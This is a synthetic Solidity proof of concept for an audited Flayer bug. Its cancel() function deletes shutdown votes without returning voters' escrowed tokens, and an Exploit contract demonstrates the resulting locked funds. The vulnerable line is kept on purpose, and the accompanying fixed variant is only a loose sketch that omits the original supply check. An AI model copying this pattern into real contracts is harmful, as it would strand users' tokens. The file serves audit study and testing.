// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — cancel() drops shutdown votes without returning collection tokens
    (Sherlock H-10, 41748). SYNTHETIC, cheatcode-free.
    Root cause: _vote pulls the voter's entire collection-token balance, and
    cancel() deletes the shutdown record once supply grows past the cap.
    Nothing is transferred back. Vulnerable line preserved (@> VULN). */

contract CollectionToken {
    string public name = "Collection";
    string public symbol = "COLL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
        totalSupply += a;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _move(msg.sender, to, a);
        return true;
    }

    function transferFrom(address from, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) allowance[from][msg.sender] = al - a;
        _move(from, to, a);
        return true;
    }

    function _move(address from, address to, uint256 a) internal {
        require(balanceOf[from] >= a, "bal");
        balanceOf[from] -= a;
        balanceOf[to] += a;
    }
}

contract CollectionInfo {
    function denomination() external pure returns (uint8) { return 0; }
}

contract Locker {
    CollectionInfo internal immutable info;

    constructor() { info = new CollectionInfo(); }

    function collectionToken(address) external view returns (CollectionInfo) { return info; }
}

contract CollectionShutdown {
    uint256 public constant MAX_SHUTDOWN_TOKENS = 2 ether;

    struct CollectionShutdownParams {
        bool canExecute;
        uint96 shutdownVotes;
        CollectionToken collectionToken;
    }

    mapping(address => CollectionShutdownParams) internal _collectionParams;
    mapping(address => mapping(address => uint256)) public shutdownVoters;
    Locker public locker;
    bool public cancelled;

    constructor(Locker _locker) { locker = _locker; }

    function init(address collection, CollectionToken token) external {
        _collectionParams[collection].collectionToken = token;
    }

    function _vote(address _collection, CollectionShutdownParams memory params)
        internal
        returns (CollectionShutdownParams memory)
    {
        uint256 userVotes = params.collectionToken.balanceOf(msg.sender);
        if (userVotes == 0) revert("UserHoldsNoTokens");
        params.collectionToken.transferFrom(msg.sender, address(this), userVotes); // STORY2
        params.shutdownVotes += uint96(userVotes);
        shutdownVoters[_collection][msg.sender] += userVotes;
        if (params.shutdownVotes >= 2 ether) params.canExecute = true;
        return params;
    }

    function vote(address collection) external {
        CollectionShutdownParams memory params = _collectionParams[collection];
        params = _vote(collection, params);
        _collectionParams[collection] = params;
    }

    function cancel(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (!params.canExecute) revert("ShutdownNotReachedQuorum");
        if (params.collectionToken.totalSupply() <= MAX_SHUTDOWN_TOKENS * 10 ** locker.collectionToken(_collection).denomination()) {
            revert("InsufficientTotalSupplyToCancel");
        }
        delete _collectionParams[_collection]; // @> VULN: vote escrow is deleted and never refunded
        // FIX: transfer shutdownVoters[_collection][voter] back to each voter before delete
        cancelled = true; // STORY5
    }

    function canExecute(address collection) external view returns (bool) {
        return _collectionParams[collection].canExecute;
    }
}

contract Voter {
    function vote(CollectionShutdown s, address collection, CollectionToken token) external {
        token.approve(address(s), type(uint256).max);
        s.vote(collection);
    }
}

contract CollectionShutdownFixed is CollectionShutdown {
    address[] public votersList;

    constructor(Locker _locker) CollectionShutdown(_locker) {}

    function voteFixed(address collection) external {
        CollectionShutdownParams memory params = _collectionParams[collection];
        uint256 userVotes = params.collectionToken.balanceOf(msg.sender);
        if (shutdownVoters[collection][msg.sender] == 0) votersList.push(msg.sender);
        params = _vote(collection, params);
        _collectionParams[collection] = params;
    }

    function cancelFixed(address collection) external {
        CollectionShutdownParams memory params = _collectionParams[collection];
        require(params.canExecute, "quorum");
        uint256 n = votersList.length;
        for (uint256 i; i < n; i++) {
            address v = votersList[i];
            uint256 owed = shutdownVoters[collection][v];
            if (owed > 0) params.collectionToken.transfer(v, owed);
        }
        delete _collectionParams[collection];
        delete votersList;
    }
}

contract Exploit {
    CollectionToken public token; // nonce 1
    Locker public locker; // nonce 2
    CollectionShutdown public shutdown; // nonce 3
    Voter public voter1; // nonce 4
    Voter public voter2; // nonce 5
    address public collection;

    constructor() {
        token = new CollectionToken();
        locker = new Locker();
        shutdown = new CollectionShutdown(locker);
        voter1 = new Voter();
        voter2 = new Voter();
        collection = address(token);
        shutdown.init(collection, token);
    }

    function run() external {
        token.mint(address(voter1), 1 ether);
        token.mint(address(voter2), 1 ether);
        token.mint(address(0x10), 1 ether); // supply 3 ether, above the 2 ether cancel cap. STORY1
        voter1.vote(shutdown, collection, token);
        voter2.vote(shutdown, collection, token); // STORY3
        require(shutdown.canExecute(collection), "quorum");
        shutdown.cancel(collection); // STORY4
        require(shutdown.cancelled(), "not cancelled");
        require(!shutdown.canExecute(collection), "still executable");
        require(token.balanceOf(address(voter1)) == 0, "voter1 refunded");
        require(token.balanceOf(address(voter2)) == 0, "voter2 refunded");
        require(token.balanceOf(address(shutdown)) == 2 ether, "votes not locked"); // STORY6
    }
}
